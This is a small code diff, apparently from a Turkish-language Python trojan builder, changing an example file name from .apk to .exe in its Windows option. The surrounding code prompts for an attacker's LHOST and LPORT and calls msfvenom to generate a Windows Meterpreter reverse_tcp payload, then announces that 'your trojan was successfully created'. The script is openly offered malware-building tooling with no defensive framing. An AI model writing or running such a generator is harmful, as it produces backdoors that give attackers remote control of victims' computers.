@@ -40,6 +40,6 @@ print("Trojanınız Başarıyla Oluşturuldu.")
 if(secenek=="2"):
 		winlhost=input("LHOST Giriniz > ")
 		winlport=input("LPORT Giriniz > ")
-		winnasilkaydedilsin=input("Hangi Dosya Dizinine Kaydedilsin? Ve Trojanın Ismi Örnek ---> root/Desktop/trojaninismi.apk > ")
+		winnasilkaydedilsin=input("Hangi Dosya Dizinine Kaydedilsin? Ve Trojanın Ismi Örnek ---> root/Desktop/trojaninismi.exe > ")
 		os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST="+winlhost+" LPORT="+winlport+" R > "+winnasilkaydedilsin+" ")
 print("Trojanınız Başarıyla Oluşturuldu.")
